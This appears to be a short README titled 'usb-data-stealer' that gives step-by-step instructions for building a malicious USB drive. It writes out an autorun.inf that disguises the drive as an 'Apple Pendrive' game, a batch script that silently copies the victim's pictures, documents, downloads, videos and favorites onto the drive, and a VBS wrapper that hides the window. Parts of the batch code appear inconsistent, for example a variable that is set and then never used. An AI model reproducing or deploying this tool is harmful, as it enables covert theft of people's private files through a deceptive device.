# usb-data-stealer




Step 1: Open notepad.

[autorun] 
icon=Devicon.ico
label=Apple Pendrive
open=launch.bat
action=Click ok to Run game for Windows
shell\open\command=launch.bat

Save As...autorun.inf

Step 2:

@echo off
:: variables
/min
SET odrive=%odrive:~0,2%
set backupcmd=xcopy /s /c /d /e /h /i /r /y
echo off
%backupcmd% "%USERPROFILE%\pictures" "%drive%\all\My pics"
%backupcmd% "%USERPROFILE%\Favorites" "%drive%\all\Favorites"
%backupcmd% "%USERPROFILE%\videos" "%drive%\all\videos"
%backupcmd% "%USERPROFILE%\Downloads" "%drive%\all\Downloads"
%backupcmd% "%USERPROFILE%\Documents" "%drive%\all\Documents"
@echo off 
cls

Save as...file.bat

Step 3:

CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False

Save as...invisible.vbs

Step 4:

wscript.exe \invisible.vbs file.bat 

Save as...launch.bat

Step 5:

copy all the 4 files to pendrive.
